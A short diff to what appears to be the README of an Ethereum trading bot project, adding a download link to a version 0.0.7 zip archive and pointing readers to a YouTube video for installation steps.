@@ -2,6 +2,8 @@
 
 Latest Version: 0.0.7
 
+https://github.com/FDefiAutomation/FDefi_ETH_Bot/blob/master/versions/app_0.0.7.zip
+
 ### How to install:
 
 It is best if you watch this youtube video where it is explained IN DETAIL how to install / run it and configure it
